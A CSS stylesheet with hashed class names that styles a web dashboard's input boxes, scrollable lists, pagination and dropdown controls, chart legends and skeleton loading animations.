    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy._3E8LCMxtlfJlmRbACd95oD svg path {
        fill: var(--ah-red-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy._3E8LCMxtlfJlmRbACd95oD:before,
    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy._3E8LCMxtlfJlmRbACd95oD:after {
        width: 50%;
        background-color: var(--ah-red-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn {
        border: 1px solid #eaeaea;
        box-sizing: border-box;
        border-radius: 2px;
        padding: 12px;
        margin: 20px 16px;
        display: grid;
        grid-template-columns: 1fr 85px;
        align-items: center
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn ._1Ch6aqSGCYxESc1MgK54db {
        font-size: 11px;
        color: var(--ah-grey-300);
        margin-bottom: 4px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn input {
        width: 100%;
        border: none !important;
        font-size: 14px;
        color: var(--ah-grey-100);
        height: 22px;
        font-size: 13px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn input ::-webkit-input-placeholder {
        color: var(--ah-grey-500)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn input :-ms-input-placeholder {
        color: var(--ah-grey-500)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn input ::placeholder {
        color: var(--ah-grey-500)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn ._3bBAJu__6yf-pP4JntCM3U {
        padding-left: 12px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn ._3bBAJu__6yf-pP4JntCM3U ._3ZzO9-UrEHQcZo70Y1sNAv {
        color: var(--ah-blue-100);
        padding: 4px 12px;
        transition: 0.15s;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 2px;
        cursor: pointer;
        user-select: none
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn ._3bBAJu__6yf-pP4JntCM3U ._3ZzO9-UrEHQcZo70Y1sNAv:hover {
        background-color: var(--ah-blue-100);
        color: #fff
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn ._3bBAJu__6yf-pP4JntCM3U ._3ZzO9-UrEHQcZo70Y1sNAv:active {
        background-color: var(--ah-blue-300);
        color: #fff
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn ._3bBAJu__6yf-pP4JntCM3U ._3ZzO9-UrEHQcZo70Y1sNAv.gCAFFlX2cFG1TWcF4hBe {
        pointer-events: none;
        color: var(--ah-grey-400)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._58E3e1pzaZixTgka9arPn ._3bBAJu__6yf-pP4JntCM3U ._3ZzO9-UrEHQcZo70Y1sNAv.gCAFFlX2cFG1TWcF4hBe * {
        pointer-events: none
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .FCnS8118TZgQBtZxptQEm {
        overflow-y: auto;
        height: 100%;
        max-height: 250px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .FCnS8118TZgQBtZxptQEm ._2609bRrjRu79xPtbGvrfzZ {
        padding: 0 16px;
        cursor: pointer;
        user-select: none
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .FCnS8118TZgQBtZxptQEm ._2609bRrjRu79xPtbGvrfzZ * {
        cursor: pointer;
        user-select: none
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .FCnS8118TZgQBtZxptQEm ._2609bRrjRu79xPtbGvrfzZ:hover {
        background-color: #f5f5f5
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .FCnS8118TZgQBtZxptQEm ._2609bRrjRu79xPtbGvrfzZ:active {
        background-color: #f1f1f1
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .FCnS8118TZgQBtZxptQEm .tl1-gGGkVRWmWqjroEYLd {
        display: grid;
        grid-template-columns: 1fr 55px;
        align-items: center;
        padding: 12px 0;
        border-bottom: solid 1px #f5f5f5
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .FCnS8118TZgQBtZxptQEm .tl1-gGGkVRWmWqjroEYLd .ZG9kt9cKVStJkih9L4a__ {
        font-weight: 700;
        color: var(--ah-grey-100);
        margin-bottom: 5px;
        display: block;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .FCnS8118TZgQBtZxptQEm .tl1-gGGkVRWmWqjroEYLd ._1xnLnZUT65VxfE_G4GywpY {
        color: var(--ah-grey-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._2TMFFjm6CsYAg0JZqw-jax {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 30px;
        padding: 12px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._2TMFFjm6CsYAg0JZqw-jax .XLziu9ps5gjvHRkG5Y9N {
        padding: 5px 12px;
        border-radius: 4px;
        color: var(--ah-grey-300);
        width: 70px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        user-select: none;
        transition: 0.15s;
        height: 32px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._2TMFFjm6CsYAg0JZqw-jax .XLziu9ps5gjvHRkG5Y9N * {
        cursor: pointer;
        user-select: none
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._2TMFFjm6CsYAg0JZqw-jax .XLziu9ps5gjvHRkG5Y9N._2Ixvy_IDqFwNkFJVdazipS {
        color: var(--ah-blue-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._2TMFFjm6CsYAg0JZqw-jax .XLziu9ps5gjvHRkG5Y9N:hover {
        background-color: var(--ah-blue-100);
        color: #fff
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._2TMFFjm6CsYAg0JZqw-jax .XLziu9ps5gjvHRkG5Y9N:active {
        background-color: var(--ah-blue-300);
        color: #fff
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._2TMFFjm6CsYAg0JZqw-jax .XLziu9ps5gjvHRkG5Y9N._32Wezd-zaGl9031y86NjDt {
        pointer-events: none;
        color: var(--ah-grey-400)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._2TMFFjm6CsYAg0JZqw-jax .XLziu9ps5gjvHRkG5Y9N._32Wezd-zaGl9031y86NjDt * {
        pointer-events: none
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._2TMFFjm6CsYAg0JZqw-jax .XLziu9ps5gjvHRkG5Y9N._2Kkz4ddsNeLQb8t2WPRugR {
        color: #fff;
        background-color: var(--ah-blue-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ::-webkit-scrollbar {
        width: 4px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ::-webkit-scrollbar-track {
        background: #f2f2f2
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ::-webkit-scrollbar-thumb {
        background: #dadada
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ::-webkit-scrollbar-thumb:hover {
        background: #999
    }

    ._100s2lnU0J-0jRlXa3a-iI .Z7sxvlSjvFRt-WJM_7EeN {
        background-color: var(--ah-white);
        padding-top: 8px;
        border-radius: 8px;
        background-color: #fff;
        box-shadow: 0px 4px 4px rgba(0, 0, 0, 0.08);
        margin-bottom: 4px
    }

    ._100s2lnU0J-0jRlXa3a-iI ._2RtVcs3OpeCy_s4UNrlXFG {
        overflow-y: auto;
        max-height: calc(100vh - 30px - var(--ah-height-nav));
        min-height: 280px;
        height: 100%
    }

    ._100s2lnU0J-0jRlXa3a-iI ::-webkit-scrollbar {
        width: 4px;
        border-radius: 30px
    }

    ._100s2lnU0J-0jRlXa3a-iI ::-webkit-scrollbar-track {
        background: transparent
    }

    ._100s2lnU0J-0jRlXa3a-iI ::-webkit-scrollbar-thumb {
        background: #dadada;
        border-radius: 30px
    }

    ._100s2lnU0J-0jRlXa3a-iI ::-webkit-scrollbar-thumb:hover {
        background: #999
    }

    ._1GVAaaHz4go67HgRhwSajE._2N3-Zk3_Phg4V6i5JWOlPk {
        box-sizing: border-box;
        border-radius: 8px;
        position: relative
    }

    ._1GVAaaHz4go67HgRhwSajE ._2KiVm4THTgy0_nnDQJYd2w {
        position: relative;
        margin-top: 15px;
        background: rgba(0, 0, 0, 0.05);
        height: 198px
    }

    ._1GVAaaHz4go67HgRhwSajE ._2KiVm4THTgy0_nnDQJYd2w ._2LgcjKXtTQHjpDnHNcI1-5 {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._1GVAaaHz4go67HgRhwSajE ._2KiVm4THTgy0_nnDQJYd2w ._2LgcjKXtTQHjpDnHNcI1-5 ._28CP9AeSi-VbQ1FIK5XzcQ span {
        display: inline-flex;
        font-size: 14px
    }

    ._1GVAaaHz4go67HgRhwSajE ._1lV3kiqVpqf3c-pffr-izW {
        display: flex;
        justify-content: space-between
    }

    ._1GVAaaHz4go67HgRhwSajE ._1lV3kiqVpqf3c-pffr-izW span {
        font-size: 20px;
        font-weight: 600;
        color: var(--ah-black-100)
    }

    ._1GVAaaHz4go67HgRhwSajE ._1lV3kiqVpqf3c-pffr-izW span span {
        display: inline-flex;
        font-size: 14px;
        font-weight: 400;
        color: var(--ah-black-100)
    }

    ._1GVAaaHz4go67HgRhwSajE ._2huDOFpNUWdKWaGGNoxEPm {
        display: flex;
        align-items: center;
        justify-content: flex-end;
        margin-bottom: 15px;
        margin-left: 10px
    }

    ._1GVAaaHz4go67HgRhwSajE ul._2FyAK67svQlw7P1fTU-IiN {
        display: flex;
        list-style: none;
        padding: 0;
        margin: 0
    }

    ._1GVAaaHz4go67HgRhwSajE ul._2FyAK67svQlw7P1fTU-IiN li {
        margin-right: 35px
    }

    ._1GVAaaHz4go67HgRhwSajE ul._2FyAK67svQlw7P1fTU-IiN li:last-child {
        margin-right: 0
    }

    ._1GVAaaHz4go67HgRhwSajE ._12DvgG5aJGqsm-RFoAM25v {
        display: flex;
        align-items: center
    }

    ._1GVAaaHz4go67HgRhwSajE ._12DvgG5aJGqsm-RFoAM25v div {
        margin: 0 4px;
        color: var(--ah-grey-100)
    }

    ._1GVAaaHz4go67HgRhwSajE ._28vkZRJtXEO-5TsPpFJn5j {
        width: 1px;
        height: 40px;
        background-color: var(--ah-grey-700)
    }

    ._1GVAaaHz4go67HgRhwSajE .fDhPuL9MU2VZx5aHu_Wfo ._2iIAAgd6duQ-V3f9HqftN0 {
        font-weight: bold;
        color: var(--ah-grey-100)
    }

    ._1GVAaaHz4go67HgRhwSajE .fDhPuL9MU2VZx5aHu_Wfo ._3WkQKTwnQSQmKUH5hCgm6T {
        color: var(--ah-primary)
    }

    ._1GVAaaHz4go67HgRhwSajE ._3QbqsGV4U1Pd0w6oLF8az3 {
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background: rgba(0, 0, 0, 0.5);
        justify-content: center;
        flex-direction: column;
        border-radius: 4px;
        display: flex;
        align-items: center
    }

    ._1GVAaaHz4go67HgRhwSajE ._3QbqsGV4U1Pd0w6oLF8az3 .lCp6MuDiXcVZTc4GbY0n5 {
        display: flex;
        align-items: center;
        color: #ffffff;
        margin-top: 16px;
        font-weight: 400;
        font-size: 14px;
        line-height: 20px
    }

    ._1GVAaaHz4go67HgRhwSajE ._3QbqsGV4U1Pd0w6oLF8az3 .lCp6MuDiXcVZTc4GbY0n5>span {
        text-decoration: underline;
        margin-left: 6px;
        color: #ffffff;
        font-weight: 400;
        font-size: 14px;
        line-height: 20px;
        cursor: pointer
    }

    ._1GVAaaHz4go67HgRhwSajE ._3QbqsGV4U1Pd0w6oLF8az3 .lCp6MuDiXcVZTc4GbY0n5>span:hover {
        opacity: 0.8
    }

    ._1GVAaaHz4go67HgRhwSajE ._2N0MWCTUH8HFf8t5GTBqwm {
        margin-top: 20px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        user-select: none;
        padding: 6px 8px;
        border-radius: 4px;
        font-size: 14px;
        color: #fff;
        background-color: var(--ah-primary);
        height: 38px;
        line-height: 42px;
        width: 215px
    }

    ._1GVAaaHz4go67HgRhwSajE ._2N0MWCTUH8HFf8t5GTBqwm:hover {
        background-color: var(--ah-primary-hover)
    }

    .bt0IugIa3glqmnYdJ-rpr {
        padding: 32px 0
    }

    .bt0IugIa3glqmnYdJ-rpr .awpeNFE2Rh0GDkvPkZWNU {
        min-height: 180px;
        position: relative
    }

    .bt0IugIa3glqmnYdJ-rpr ._3YF56D4g3JawXC6SaU11pJ {
        height: 100% !important
    }

    ._1L1OlOSPrhrACssSlz39OW {
        display: inline-flex !important
    }

    ._1L1OlOSPrhrACssSlz39OW ._3XjH6BjCzm5XMfieO5YXGL {
        position: relative
    }

    ._1L1OlOSPrhrACssSlz39OW ._3ZpI3UJFOpCJiqxEdyoAYU {
        color: #ababab;
        font-size: 12px;
        line-height: 16px
    }

    ._1L1OlOSPrhrACssSlz39OW ._2P7wyyFwA8rp1Gw2zcgE2U {
        display: inline-flex;
        align-items: center;
        cursor: pointer;
        user-select: none;
        padding: 6px 0
    }

    ._1L1OlOSPrhrACssSlz39OW ._2P7wyyFwA8rp1Gw2zcgE2U * {
        cursor: pointer;
        user-select: none
    }

    ._1L1OlOSPrhrACssSlz39OW ._2P7wyyFwA8rp1Gw2zcgE2U:hover ._3ZpI3UJFOpCJiqxEdyoAYU {
        color: var(--ah-blue-100)
    }

    ._1L1OlOSPrhrACssSlz39OW ._2P7wyyFwA8rp1Gw2zcgE2U:hover .u8bs3cxdJnfOZBG9Blvtj svg path {
        fill: var(--ah-blue-100)
    }

    ._1L1OlOSPrhrACssSlz39OW ._2P7wyyFwA8rp1Gw2zcgE2U:active ._3ZpI3UJFOpCJiqxEdyoAYU {
        color: var(--ah-blue-300)
    }

    ._1L1OlOSPrhrACssSlz39OW ._2P7wyyFwA8rp1Gw2zcgE2U:active .u8bs3cxdJnfOZBG9Blvtj svg path {
        fill: var(--ah-blue-300)
    }

    ._1L1OlOSPrhrACssSlz39OW .u8bs3cxdJnfOZBG9Blvtj {
        width: 10px;
        margin-left: 10px;
        display: flex;
        justify-content: center;
        align-items: center;
        color: var(--ah-black-200)
    }

    ._1L1OlOSPrhrACssSlz39OW .u8bs3cxdJnfOZBG9Blvtj svg {
        transition: all 0.15s ease-in-out
    }

    ._1L1OlOSPrhrACssSlz39OW .u8bs3cxdJnfOZBG9Blvtj svg path {
        color: #ababab
    }

    ._1L1OlOSPrhrACssSlz39OW .lywDvgmHRQ9P2uEjIwe1Y {
        background: #ffffff;
        border: 1px solid #f5f5f5;
        box-sizing: border-box;
        box-shadow: 0px 2px 30px rgba(0, 0, 0, 0.05);
        border-radius: 4px;
        padding: 4px 0;
        position: absolute;
        top: 100%;
        right: 0;
        min-width: 60px;
        z-index: 9;
        display: none;
        max-height: 300px;
        overflow-y: auto;
        overflow-x: hidden
    }

    ._1L1OlOSPrhrACssSlz39OW .lywDvgmHRQ9P2uEjIwe1Y .qN-TF4VDhRWQjpldl-da0 {
        font-size: 14px;
        line-height: 20px;
        cursor: pointer;
        user-select: none;
        padding: 8px 16px;
        margin-bottom: 2px;
        white-space: nowrap
    }

    ._1L1OlOSPrhrACssSlz39OW .lywDvgmHRQ9P2uEjIwe1Y .qN-TF4VDhRWQjpldl-da0:last-child {
        margin-bottom: 0
    }

    ._1L1OlOSPrhrACssSlz39OW .lywDvgmHRQ9P2uEjIwe1Y .qN-TF4VDhRWQjpldl-da0 * {
        cursor: pointer;
        user-select: none
    }

    ._1L1OlOSPrhrACssSlz39OW .lywDvgmHRQ9P2uEjIwe1Y .qN-TF4VDhRWQjpldl-da0:hover {
        background-color: #adadad21
    }

    ._1L1OlOSPrhrACssSlz39OW .lywDvgmHRQ9P2uEjIwe1Y .sPcmhKvJafdTrX4VldLlp {
        background-color: #54545421 !important
    }

    ._1L1OlOSPrhrACssSlz39OW ._7_4aZRh7sMhTHM33n1uqs .lywDvgmHRQ9P2uEjIwe1Y {
        display: block
    }

    ._1L1OlOSPrhrACssSlz39OW ._7_4aZRh7sMhTHM33n1uqs ._3ZpI3UJFOpCJiqxEdyoAYU {
        color: var(--ah-blue-100)
    }

    ._1L1OlOSPrhrACssSlz39OW ._7_4aZRh7sMhTHM33n1uqs .u8bs3cxdJnfOZBG9Blvtj svg {
        transform: rotate(-180deg)
    }

    ._1L1OlOSPrhrACssSlz39OW ._7_4aZRh7sMhTHM33n1uqs .u8bs3cxdJnfOZBG9Blvtj svg path {
        fill: var(--ah-blue-300)
    }

    ._1L1OlOSPrhrACssSlz39OW ._2IQE6OBWEf68p2jYaLz7Mr .lywDvgmHRQ9P2uEjIwe1Y {
        bottom: 100%;
        top: initial
    }

    ._1vKeF4G-8fjCI5vVGuAFPX._16hHuL0zYf-YIhIAu_lTVy {
        box-sizing: border-box;
        border-radius: 8px;
        margin-bottom: 10px
    }

    ._1vKeF4G-8fjCI5vVGuAFPX ._3bxqfJue0em6aPMmvPOyDG {
        display: flex;
        justify-content: space-between
    }

    ._1vKeF4G-8fjCI5vVGuAFPX ._3bxqfJue0em6aPMmvPOyDG span {
        display: inline-flex;
        align-items: center;
        font-size: 20px;
        font-weight: 600;
        color: var(--ah-black-100)
    }

    ._1vKeF4G-8fjCI5vVGuAFPX ._3bxqfJue0em6aPMmvPOyDG span span {
        display: inline-flex;
        font-size: 14px;
        font-weight: 400;
        margin: 0 15px
    }

    ._1vKeF4G-8fjCI5vVGuAFPX ._3ncu04KcvwRsIH5WroUavW {
        font-weight: 700;
        color: var(--ah-grey-100);
        font-size: 12px;
        margin-bottom: 1px
    }

    ._1vKeF4G-8fjCI5vVGuAFPX ._32r0lJH3lUYiQ6aLurdTE- {
        color: var(--ah-grey-300)
    }

    ._1fKk2w06MPMtytbs2gW7Zd {
        position: relative !important;
        margin-top: 15px;
        background: rgba(0, 0, 0, 0.05);
        height: 198px
    }

    ._1fKk2w06MPMtytbs2gW7Zd ._2UaIRZvKYHdHQC9F3Yon9U {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._1fKk2w06MPMtytbs2gW7Zd ._2UaIRZvKYHdHQC9F3Yon9U ._3n7hEexkMoFx6eywYtmp5h span {
        display: inline-flex;
        font-size: 14px
    }

    .Rq7RYPjmVhJVEvy9tIXEi ._1_SrYmnXwihD7B0GfXA5uH {
        background: rgba(0, 0, 0, 0.12);
        border-radius: 2px;
        box-sizing: border-box;
        position: relative;
        overflow: hidden;
        z-index: 1;
        height: 100%;
        width: 100%
    }

    .Rq7RYPjmVhJVEvy9tIXEi .-Qhl36YnswWfY3B2TW3sp {
        border-radius: 50%
    }

    .Rq7RYPjmVhJVEvy9tIXEi ._1_SrYmnXwihD7B0GfXA5uH:before {
        content: '\00a0'
    }

    .Rq7RYPjmVhJVEvy9tIXEi ._1_SrYmnXwihD7B0GfXA5uH:after {
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
        animation: _3OxXK-W-AZzCUO-wu8FHtS 1.5s linear 0.5s infinite;
        content: '';
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        z-index: 0
    }

    @keyframes _3OxXK-W-AZzCUO-wu8FHtS {
        0% {
            transform: translateX(-100%)
        }

        100% {
            transform: translateX(100%)
        }
    }

    .Rq7RYPjmVhJVEvy9tIXEi ._3_BvYjL_mz6D8AfNyKascT {
        display: flex;
        justify-content: center;
        align-items: center;
        background: rgba(0, 0, 0, 0.05);
        border-radius: 2px;
        box-sizing: border-box;
        position: relative;
        overflow: hidden;
        z-index: 1;
        height: 100%;
        width: 100%
    }

    .Rq7RYPjmVhJVEvy9tIXEi ._3_BvYjL_mz6D8AfNyKascT._3M8t0JwPztcfhb20pMKgPs:after {
        animation: none
    }

    .Rq7RYPjmVhJVEvy9tIXEi ._3_BvYjL_mz6D8AfNyKascT:before {
        content: '\00a0'
    }

    .Rq7RYPjmVhJVEvy9tIXEi ._3_BvYjL_mz6D8AfNyKascT:after {
        background: linear-gradient(90deg, transparent, rgba(222, 222, 222, 0.5), transparent);
        animation: _3OxXK-W-AZzCUO-wu8FHtS 1.5s linear 0.5s infinite;
        content: '';
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        z-index: 0
    }

    ._1WKwbZ6RG496m5VhHVPfsc {
        padding: 32px 0
    }

    ._1WKwbZ6RG496m5VhHVPfsc .VXZGGf6yeZrGU6SkqjmeJ {
        min-height: 180px;
        position: relative
    }

    ._1WKwbZ6RG496m5VhHVPfsc ._3IV1vO0dXq6SklvtZ3g7zG {
        height: 100% !important
    }

    ._3MCzYxHSI1lem9Bc7GZpXR.IU0mqHjNJGdcGpnGyiboJ {
        padding: 24px
    }

    ._3MCzYxHSI1lem9Bc7GZpXR.IU0mqHjNJGdcGpnGyiboJ ._3UltaIbjPvtpntSpGbxM_H {
        width: 296px;
        height: 208px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: contain;
        margin: auto;
        margin-bottom: 16px
    }

    ._3MCzYxHSI1lem9Bc7GZpXR.IU0mqHjNJGdcGpnGyiboJ ._1iWwPwDWeDmZm7RNggzgtl {
        line-height: 20px;
        text-align: center;
        color: var(--ah-grey-100)
    }

    ._3MCzYxHSI1lem9Bc7GZpXR.IU0mqHjNJGdcGpnGyiboJ ._1iWwPwDWeDmZm7RNggzgtl .A0BnfsOIdlaglNqvMymAW {
        display: inline-block;
        font-weight: bold;
        color: var(--ah-grey-100)
    }

    ._3AMeJuZ85LE9PSE2FbSBAP._1tnU4EYj9c1_WyiD_2xnCf {
        margin-bottom: 16px;
        margin-top: 24px
    }

    ._3AMeJuZ85LE9PSE2FbSBAP._1tnU4EYj9c1_WyiD_2xnCf ._1LEVe-MRwQOdrLJpfwYo0n {
        display: grid;
        grid-template-columns: 1fr 1fr 0.75fr;
        gap: 20px;
        margin-bottom: 16px
    }

    ._3AMeJuZ85LE9PSE2FbSBAP._1tnU4EYj9c1_WyiD_2xnCf ._1zOXhH7ke-q77KB9DaaEOy {
        border: 1px solid #f5f5f5;
        border-radius: 8px;
        padding: 16px 0;
        padding-right: 1px;
        width: 274px;
        width: 100%
    }

    ._3AMeJuZ85LE9PSE2FbSBAP._1tnU4EYj9c1_WyiD_2xnCf ._3aZFPxdUxl_UDu4utc3LbL {
        display: flex;
        align-items: center;
        line-height: 16px;
        padding-bottom: 16px;
        padding-left: 16px;
        margin-bottom: 2px;
        border-bottom: solid 1px #f5f5f5;
        position: relative;
        font-size: 12px;
        font-weight: 400
    }

    ._3AMeJuZ85LE9PSE2FbSBAP._1tnU4EYj9c1_WyiD_2xnCf ._3aZFPxdUxl_UDu4utc3LbL svg {
        margin-right: 6px
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .mHNvK9slcNcWDPJFZUwc5 {
        display: grid;
        grid-template-columns: 1fr 1fr 1fr;
        gap: 20px 16px;
        margin-top: 35px;
        padding: 0 11px
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .mHNvK9slcNcWDPJFZUwc5 ._1yTeVlP49WtNtjSXgK71_r {
        position: relative;
        color: var(--ah-grey-200);
        padding-left: 18px;
        font-size: 11px
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .mHNvK9slcNcWDPJFZUwc5 ._1yTeVlP49WtNtjSXgK71_r:before {
        content: '';
        position: absolute;
        width: 8px;
        height: 8px;
        border-radius: 50%;
        top: 50%;
        left: 0;
        transform: translateY(-50%)
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .mHNvK9slcNcWDPJFZUwc5 .ZDNb_QgxCu1ai9pznBoLB:before {
        background-color: #35c5bc
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .mHNvK9slcNcWDPJFZUwc5 ._37VpjgxaFFPMm2X8EwuhQ5:before {
        background-color: #f0a92e
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .mHNvK9slcNcWDPJFZUwc5 ._2TxVYB_3jqrf59kYzFiXDx:before {
        background-color: #0076f1
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .mHNvK9slcNcWDPJFZUwc5 .tcBTRxiFVYx4PLzLU3lpz:before {
        background-color: #d5d5d5
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .mHNvK9slcNcWDPJFZUwc5 ._110MV-P2-3M5JV9iuH0irG:before {
        background-color: #e9162b
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .G90VA8LrM-uRJCgnY_CKS {
        display: flex;
        justify-content: space-between;
        margin-top: 16px;
        padding: 0 16px;
        border-top: 1px solid #d9d9d9;
        padding: 16px 16px 0
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .G90VA8LrM-uRJCgnY_CKS span {
        font-size: 12px
    }

    ._1GaUJfc6Ff44kt44mQ2tpl .G90VA8LrM-uRJCgnY_CKS span._1mA_F58jrghlqAIiLfBJy7 {
        font-weight: 700;
        margin-top: 4px
    }

    ._1IQr3DVCbjGk5f-ehOa2dV ._1Rjm9gP81MMK1phs0X_K0N {
        width: 100%;
        position: relative;
        background-repeat: no-repeat;
        background-position: center
    }

    ._1IQr3DVCbjGk5f-ehOa2dV ._1Rjm9gP81MMK1phs0X_K0N canvas {
        width: 222px
    }

    ._1IQr3DVCbjGk5f-ehOa2dV ._1FO00_4ln_hDzs5Jf7GsmD {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        font-weight: bold;
        font-size: 14px;
        line-height: 22px;
        color: var(--ah-grey-100);
        display: flex
    }

    ._1IQr3DVCbjGk5f-ehOa2dV ._1FO00_4ln_hDzs5Jf7GsmD div {
        font-size: 14px;
        line-height: 22px;
        color: var(--ah-grey-100)
    }

    ._3FIQJRENuprIAVwgEyCtDI._3UvC84OH5E8jz3SykcULyO ::-webkit-scrollbar-thumb {
        background: transparent
    }

    ._3FIQJRENuprIAVwgEyCtDI._3UvC84OH5E8jz3SykcULyO:hover ::-webkit-scrollbar-thumb {
        background: #dadada
    }

    ._3FIQJRENuprIAVwgEyCtDI._3UvC84OH5E8jz3SykcULyO:hover ::-webkit-scrollbar-thumb:hover {
        background: #999
    }

